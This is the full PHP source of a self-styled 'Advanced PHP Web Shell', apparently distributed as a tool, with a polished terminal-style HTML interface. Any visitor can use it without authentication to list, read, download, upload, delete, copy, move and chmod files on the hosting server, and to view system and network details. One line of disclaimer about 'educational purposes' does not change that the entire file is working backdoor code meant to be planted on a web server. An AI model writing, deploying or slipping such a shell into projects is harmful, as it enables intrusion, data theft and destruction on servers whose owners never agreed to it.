<?php
// Start or resume the session
session_start();

// Check if 'cmd' parameter is provided in the URL
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];

    // Map the 'cmd' parameter to the corresponding function
    switch ($command) {
        case 'ls':
            echo ls();
            break;

        case 'pwd':
            echo pwd();
            break;

        case 'sysinfo':
            echo sysinfo();
            break;

        case 'processes':
            echo processes();
            break;

        case 'network':
            echo network();
            break;

        default:
            echo "Unknown command: $command";
            break;
    }

    exit; // Terminate script after processing the command
} elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Check if the form is submitted with a file upload
    if (isset($_FILES["fileToUpload"])) {
        $output = upload();
        echo $output;
        exit;
    }

    $command = $_POST["command"];
    $output = '';

    $parts = explode(' ', $command);
    $operation = strtolower(trim(array_shift($parts)));

    switch ($operation) {
        case 'ls':
            $output = ls();
            break;

        case 'pwd':
            $output = pwd();
            break;

        case 'cd':
            $output = cd($parts);
            break;

        case 'touch':
            $output = touchFile($parts);
            break;

        case 'rm':
            $output = remove($parts);
            break;

        case 'mkdir':
            $output = mkdirCommand($parts);
            break;

        case 'rmdir':
            $output = rmdirCommand($parts);
            break;

        case 'download':
            download($parts);
            exit;

        case 'cat':
            $output = cat($parts);
            break;

        case 'cp':
            $output = copyFile($parts);
            break;

        case 'mv':
            $output = moveFile($parts);
            break;

        case 'chmod':
            $output = chmodFile($parts);
            break;

        case 'find':
            $output = find($parts);
            break;

        case 'sysinfo':
            $output = sysinfo();
            break;

        case 'processes':
            $output = processes();
            break;

        case 'network':
            $output = network();
            break;

        case 'clear':
            $output = '';
            break;

        default:
            $output = "Unknown command: $operation. Type 'help' for available commands.";
            break;
    }

    // Output the result
    echo $output;
    exit; // Terminate execution after handling the command
}

function ls() {
    $files = scandir(getCurrentDirectory());
    $output = "Directory listing for: " . getCurrentDirectory() . "\n";
    $output .= str_repeat("-", 80) . "\n";
    $output .= sprintf("%-50s %-15s %-10s\n", "Name", "Size", "Type");
    $output .= str_repeat("-", 80) . "\n";
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $filepath = getCurrentDirectory() . '/' . $file;
        $size = is_file($filepath) ? filesize($filepath) : '-';
        $type = is_dir($filepath) ? 'DIR' : 'FILE';
        $output .= sprintf("%-50s %-15s %-10s\n", $file, $size, $type);
    }
    return $output;
}

function pwd() {
    return getCurrentDirectory();
}

function cd($parts) {
    session_start(); // Start or resume a session

    if (!isset($_SESSION['current_directory'])) {
        $_SESSION['current_directory'] = getcwd(); // Initialize current directory
    }

    if (count($parts) > 0) {
        $directory = implode(' ', $parts);
        $currentDirectory = $_SESSION['current_directory'];

        // Handle special cases
        if ($directory === '..') {
            $parentDir = dirname($currentDirectory);
            $_SESSION['current_directory'] = $parentDir;
            return "Changed directory to: " . $_SESSION['current_directory'];
        } elseif ($directory === '~' || $directory === '/') {
            $_SESSION['current_directory'] = getcwd();
            return "Changed directory to: " . $_SESSION['current_directory'];
        }

        // Check if the target directory exists
        if (is_dir($currentDirectory . '/' . $directory)) {
            $_SESSION['current_directory'] = realpath($currentDirectory . '/' . $directory);
            return "Changed directory to: " . $_SESSION['current_directory'];
        } else {
            return "Directory not found: $directory";
        }
    } else {
        return "Usage: cd [directory]";
    }
}

function getCurrentDirectory() {
    // Check if the current directory is set in the session
    if (isset($_SESSION['current_directory'])) {
        return $_SESSION['current_directory'];
    } else {
        // If not set, use the current working directory
        return getcwd();
    }
}

function touchFile($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            return "File already exists: $filename";
        } else {
            if (touch($filepath)) {
                return "File created: $filename";
            } else {
                return "Failed to create file: $filename";
            }
        }
    } else {
        return "Usage: touch [filename]";
    }
}

function remove($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            if (is_dir($filepath)) {
                if (removeDirectory($filepath)) {
                    return "Directory removed: $filename";
                } else {
                    return "Failed to remove directory: $filename";
                }
            } else {
                if (unlink($filepath)) {
                    return "File removed: $filename";
                } else {
                    return "Failed to remove file: $filename";
                }
            }
        } else {
            return "File/Directory not found: $filename";
        }
    } else {
        return "Usage: rm [filename]";
    }
}

function mkdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath)) {
            return "Directory already exists: $dirname";
        } else {
            if (mkdir($dirpath, 0755, true)) {
                return "Directory created: $dirname";
            } else {
                return "Failed to create directory: $dirname";
            }
        }
    } else {
        return "Usage: mkdir [directory]";
    }
}

function rmdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath) && is_dir($dirpath)) {
            if (removeDirectory($dirpath)) {
                return "Directory removed: $dirname";
            } else {
                return "Failed to remove directory: $dirname";
            }
        } else {
            return "Directory not found: $dirname";
        }
    } else {
        return "Usage: rmdir [directory]";
    }
}

function removeDirectory($dir) {
    if (!file_exists($dir) || !is_dir($dir)) return false;

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (is_dir($dir . DIRECTORY_SEPARATOR . $item)) {
            if (!removeDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
        } else {
            if (!unlink($dir . DIRECTORY_SEPARATOR . $item)) return false;
        }
    }

    return rmdir($dir);
}

function download($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;

        if (file_exists($filepath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($filepath));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            readfile($filepath);
            exit;
        } else {
            echo "File not found: $filename";
        }
    } else {
        echo "Usage: download [filename]";
    }
}

function upload() {
    if ($_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $filename = basename($_FILES['fileToUpload']['name']);
        $directory = getCurrentDirectory(); // Get the current directory
        $destination = $directory . '/' . $filename; // Set the destination directory

        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $destination)) {
            return "File uploaded successfully: $filename";
        } else {
            return "Failed to upload file: $filename";
        }
    } else {
        return "File upload error: " . $_FILES['fileToUpload']['error'];
    }
}

// New functions for enhanced functionality
function cat($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            if (is_dir($filepath)) {
                return "Cannot display directory as file: $filename";
            } else {
                $content = file_get_contents($filepath);
                if ($content !== false) {
                    return "File: $filename\n" . str_repeat("-", 50) . "\n$content";
                } else {
                    return "Failed to read file: $filename";
                }
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: cat [filename]";
    }
}

function copyFile($parts) {
    if (count($parts) >= 2) {
        $source = $parts[0];
        $destination = $parts[1];
        $directory = getCurrentDirectory();
        $sourcePath = $directory . '/' . $source;
        $destPath = $directory . '/' . $destination;
        
        if (file_exists($sourcePath)) {
            if (copy($sourcePath, $destPath)) {
                return "File copied from '$source' to '$destination'";
            } else {
                return "Failed to copy file from '$source' to '$destination'";
            }
        } else {
            return "Source file not found: $source";
        }
    } else {
        return "Usage: cp [source] [destination]";
    }
}

function moveFile($parts) {
    if (count($parts) >= 2) {
        $source = $parts[0];
        $destination = $parts[1];
        $directory = getCurrentDirectory();
        $sourcePath = $directory . '/' . $source;
        $destPath = $directory . '/' . $destination;
        
        if (file_exists($sourcePath)) {
            if (rename($sourcePath, $destPath)) {
                return "File moved from '$source' to '$destination'";
            } else {
                return "Failed to move file from '$source' to '$destination'";
            }
        } else {
            return "Source file not found: $source";
        }
    } else {
        return "Usage: mv [source] [destination]";
    }
}

function chmodFile($parts) {
    if (count($parts) >= 2) {
        $mode = $parts[0];
        $filename = implode(' ', array_slice($parts, 1));
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        
        if (file_exists($filepath)) {
            // Convert octal string to decimal
            $mode = octdec(str_pad($mode, 4, '0', STR_PAD_LEFT));
            if (chmod($filepath, $mode)) {
                return "Permissions changed for '$filename' to " . decoct($mode);
            } else {
                return "Failed to change permissions for '$filename'";
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: chmod [mode] [filename]";
    }
}

function find($parts) {
    if (count($parts) > 0) {
        $searchTerm = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $results = [];
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        
        foreach ($iterator as $file) {
            if (strpos($file->getFilename(), $searchTerm) !== false) {
                $results[] = $file->getPathname();
            }
        }
        
        if (count($results) > 0) {
            return "Found " . count($results) . " items matching '$searchTerm':\n" . implode("\n", $results);
        } else {
            return "No items found matching '$searchTerm'";
        }
    } else {
        return "Usage: find [search_term]";
    }
}

function sysinfo() {
    $output = "System Information\n";
    $output .= str_repeat("=", 50) . "\n";
    $output .= "OS: " . php_uname() . "\n";
    $output .= "PHP Version: " . phpversion() . "\n";
    $output .= "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
    $output .= "Server Name: " . $_SERVER['SERVER_NAME'] . "\n";
    $output .= "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
    $output .= "Current Directory: " . getCurrentDirectory() . "\n";
    $output .= "Memory Usage: " . round(memory_get_usage() / 1024 / 1024, 2) . " MB\n";
    $output .= "Memory Peak Usage: " . round(memory_get_peak_usage() / 1024 / 1024, 2) . " MB\n";
    return $output;
}

function processes() {
    $output = "Process Information\n";
    $output .= str_repeat("=", 50) . "\n";
    $output .= "This feature requires system-level access which is not available in PHP web context.\n";
    $output .= "For security reasons, process information is not accessible through web shells.\n";
    return $output;
}

function network() {
    $output = "Network Information\n";
    $output .= str_repeat("=", 50) . "\n";
    $output .= "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
    $output .= "Server Port: " . $_SERVER['SERVER_PORT'] . "\n";
    $output .= "Remote IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $output .= "Remote Port: " . $_SERVER['REMOTE_PORT'] . "\n";
    $output .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    return $output;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced PHP Web Shell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #4e54c8;
            --secondary: #8f94fb;
            --dark: #1a1a2e;
            --darker: #16213e;
            --light: #f0f0f0;
            --success: #4ade80;
            --danger: #f87171;
            --warning: #fbbf24;
            --info: #60a5fa;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--darker), var(--dark));
            color: var(--light);
            margin: 0;
            display: flex;
            min-height: 100vh;
        }

        .sidebar {
            width: 280px;
            background: rgba(26, 26, 46, 0.9);
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            border-right: 1px solid rgba(143, 148, 251, 0.3);
            backdrop-filter: blur(10px);
            overflow-y: auto;
            height: 100vh;
            position: sticky;
            top: 0;
        }

        .sidebar-header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(143, 148, 251, 0.3);
        }

        .sidebar-header h1 {
            color: var(--secondary);
            font-size: 24px;
            margin-bottom: 5px;
        }

        .sidebar-header p {
            color: var(--info);
            font-size: 14px;
        }

        .sidebar-section {
            margin-bottom: 25px;
        }

        .sidebar-section h2 {
            color: var(--secondary);
            font-size: 18px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .sidebar-section h2 i {
            color: var(--info);
        }

        .sidebar ul {
            list-style: none;
            padding: 0;
        }

        .sidebar ul li {
            margin-bottom: 12px;
        }

        .sidebar ul li span {
            color: var(--light);
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .sidebar ul li span.command {
            color: var(--info);
            font-family: monospace;
        }

        .sidebar ul li span.desc {
            color: #a0aec0;
            font-size: 13px;
            margin-left: 25px;
        }

        .documentation {
            font-size: 12px;
            color: #a0aec0;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid rgba(143, 148, 251, 0.3);
        }

        .documentation .legal {
            margin-bottom: 10px;
            line-height: 1.5;
        }

        .terminal-container {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            padding: 20px;
            overflow: hidden;
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(143, 148, 251, 0.3);
        }

        .terminal-header h2 {
            color: var(--secondary);
            font-size: 22px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .terminal-header-buttons {
            display: flex;
            gap: 10px;
        }

        .terminal-header-buttons button {
            background: rgba(78, 84, 200, 0.3);
            color: var(--light);
            border: 1px solid var(--secondary);
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .terminal-header-buttons button:hover {
            background: var(--secondary);
            color: var(--dark);
        }

        .terminal {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            background: rgba(26, 26, 46, 0.7);
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid rgba(143, 148, 251, 0.3);
            backdrop-filter: blur(10px);
            overflow: hidden;
        }

        #output {
            white-space: pre-wrap;
            background: rgba(10, 10, 20, 0.7);
            color: var(--light);
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid rgba(143, 148, 251, 0.2);
            border-radius: 8px;
            height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.4;
        }

        #output .success {
            color: var(--success);
        }

        #output .error {
            color: var(--danger);
        }

        #output .info {
            color: var(--info);
        }

        .input-area {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .command-input {
            display: flex;
            gap: 10px;
        }

        .prompt {
            color: var(--success);
            font-family: 'Courier New', monospace;
            font-weight: bold;
            padding: 10px;
            background: rgba(10, 10, 20, 0.7);
            border: 1px solid rgba(143, 148, 251, 0.2);
            border-radius: 5px 0 0 5px;
            display: flex;
            align-items: center;
        }

        input[type="text"] {
            flex-grow: 1;
            background: rgba(10, 10, 20, 0.7);
            color: var(--light);
            border: 1px solid rgba(143, 148, 251, 0.2);
            padding: 10px 15px;
            border-radius: 0 5px 5px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: var(--secondary);
            box-shadow: 0 0 10px rgba(143, 148, 251, 0.5);
        }

        .upload-section {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        input[type="file"] {
            flex-grow: 1;
            background: rgba(10, 10, 20, 0.7);
            color: var(--light);
            border: 1px solid rgba(143, 148, 251, 0.2);
            padding: 10px 15px;
            border-radius: 5px;
        }

        input[type="submit"] {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        input[type="submit"]:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(143, 148, 251, 0.4);
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            font-size: 12px;
            color: #a0aec0;
            border-top: 1px solid rgba(143, 148, 251, 0.2);
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                height: auto;
                max-height: 300px;
            }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h1><i class="fas fa-terminal"></i> PHP Web Shell</h1>
            <p>Advanced File Management System</p>
        </div>
        
        <div class="sidebar-section">
            <h2><i class="fas fa-book"></i> File Commands</h2>
            <ul>
                <li><span class="command">ls</span> <span class="desc">List directory contents</span></li>
                <li><span class="command">pwd</span> <span class="desc">Print working directory</span></li>
                <li><span class="command">cd [dir]</span> <span class="desc">Change directory</span></li>
                <li><span class="command">touch [file]</span> <span class="desc">Create new file</span></li>
                <li><span class="command">rm [file]</span> <span class="desc">Remove file/directory</span></li>
                <li><span class="command">mkdir [dir]</span> <span class="desc">Create directory</span></li>
                <li><span class="command">rmdir [dir]</span> <span class="desc">Remove directory</span></li>
                <li><span class="command">cat [file]</span> <span class="desc">Display file contents</span></li>
                <li><span class="command">cp [src] [dst]</span> <span class="desc">Copy file</span></li>
                <li><span class="command">mv [src] [dst]</span> <span class="desc">Move/rename file</span></li>
                <li><span class="command">chmod [mode] [file]</span> <span class="desc">Change permissions</span></li>
                <li><span class="command">find [term]</span> <span class="desc">Search for files</span></li>
            </ul>
        </div>
        
        <div class="sidebar-section">
            <h2><i class="fas fa-download"></i> Transfer Commands</h2>
            <ul>
                <li><span class="command">download [file]</span> <span class="desc">Download file</span></li>
            </ul>
        </div>
        
        <div class="sidebar-section">
            <h2><i class="fas fa-info-circle"></i> System Commands</h2>
            <ul>
                <li><span class="command">sysinfo</span> <span class="desc">System information</span></li>
                <li><span class="command">network</span> <span class="desc">Network information</span></li>
                <li><span class="command">clear</span> <span class="desc">Clear terminal</span></li>
            </ul>
        </div>
        
        <div class="documentation">
            <p class="legal">🙏This tool is for educational purposes only. Use it only on servers you own or have permission to access. 😠Unauthorized use is illegal. ⚠️Users are advised to utilize it at their own risk.</p>
        </div>
    </div>
    
    <div class="terminal-container">
        <div class="terminal-header">
            <h2><i class="fas fa-terminal"></i> Terminal</h2>
            <div class="terminal-header-buttons">
                <button id="clear-btn"><i class="fas fa-broom"></i> Clear</button>
                <button id="help-btn"><i class="fas fa-question-circle"></i> Help</button>
            </div>
        </div>
        
        <div class="terminal">
            <div id="output">Welcome to Advanced PHP Web Shell v2.0!
Type 'help' for available commands or 'sysinfo' for system information.

Current Directory: <?php echo getCurrentDirectory(); ?>

</div>
            
            <div class="input-area">
                <form id="command-form" method="post">
                    <div class="command-input">
                        <div class="prompt">$</div>
                        <input type="text" id="command" name="command" autocomplete="off" autofocus placeholder="Enter command...">
                    </div>
                    <input type="submit" value="Execute">
                </form>
                
                <form id="upload-form" method="post" enctype="multipart/form-data">
                    <div class="upload-section">
                        <input type="file" name="fileToUpload" id="fileToUpload">
                        <input type="submit" value="Upload File">
                    </div>
                </form>
            </div>
            
            <div class="status-bar">
                <div>PHP Web Shell v2.0</div>
                <div>Ready</div>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById("command-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);
            const commandInput = document.getElementById("command");
            const command = commandInput.value.trim();
            
            if (command === 'help') {
                displayHelp();
                commandInput.value = '';
                return;
            }
            
            if (command === 'clear') {
                document.getElementById("output").textContent = '';
                commandInput.value = '';
                return;
            }

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                const output = document.getElementById("output");
                output.textContent += "$ " + command + "\n" + data + "\n\n";
                output.scrollTop = output.scrollHeight;
                commandInput.value = '';
            })
            .catch(error => {
                console.error("Error:", error);
                const output = document.getElementById("output");
                output.textContent += "$ " + command + "\nError: " + error + "\n\n";
                output.scrollTop = output.scrollHeight;
                commandInput.value = '';
            });
        });

        document.getElementById("upload-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                const output = document.getElementById("output");
                output.textContent += "Upload: " + data + "\n\n";
                output.scrollTop = output.scrollHeight;
                document.getElementById("fileToUpload").value = '';
            })
            .catch(error => {
                console.error("Error:", error);
                const output = document.getElementById("output");
                output.textContent += "Upload Error: " + error + "\n\n";
                output.scrollTop = output.scrollHeight;
                document.getElementById("fileToUpload").value = '';
            });
        });
        
        document.getElementById("clear-btn").addEventListener("click", function() {
            document.getElementById("output").textContent = '';
            document.getElementById("command").focus();
        });
        
        document.getElementById("help-btn").addEventListener("click", function() {
            displayHelp();
        });
        
        function displayHelp() {
            const helpText = `Available Commands:
File Commands:
  ls                    - List directory contents
  pwd                   - Print working directory
  cd [dir]              - Change directory
  touch [file]          - Create new file
  rm [file]             - Remove file/directory
  mkdir [dir]           - Create directory
  rmdir [dir]           - Remove directory
  cat [file]            - Display file contents
  cp [src] [dst]        - Copy file
  mv [src] [dst]        - Move/rename file
  chmod [mode] [file]   - Change permissions
  find [term]           - Search for files

Transfer Commands:
  download [file]       - Download file

System Commands:
  sysinfo               - System information
  network               - Network information
  clear                 - Clear terminal
`;
            const output = document.getElementById("output");
            output.textContent += helpText + "\n";
            output.scrollTop = output.scrollHeight;
        }
        
        // Focus on command input when page loads
        window.addEventListener("load", function() {
            document.getElementById("command").focus();
        });
    </script>
</body>
</html>
